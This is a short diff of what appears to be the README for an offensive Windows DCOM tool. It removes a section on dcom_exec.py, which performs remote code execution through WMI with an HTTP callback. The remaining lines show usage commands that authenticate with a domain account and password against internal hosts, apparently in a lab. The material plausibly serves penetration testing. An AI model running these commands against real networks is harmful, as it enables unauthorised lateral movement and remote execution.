@@ -18,13 +18,6 @@ python3 DCOMatMEbro.py ecorp.local/dcomuser:'DCOMPwn2026!'@192.168.15.40 -min-se
 python3 DCOMatMEbro.py -targets-file targets.txt ecorp.local/dcomuser:'DCOMPwn2026!'
 ```
 
-### dcom_exec.py
-Session-less DCOM code execution via WMI Win32_Process.Create with HTTP callback for output retrieval.
-
-```
-python3 dcom_exec.py ecorp.local/dcomuser:'DCOMPwn2026!'@192.168.15.40 'whoami /all'
-```
-
 ## Requirements
 - Python 3
 - impacket
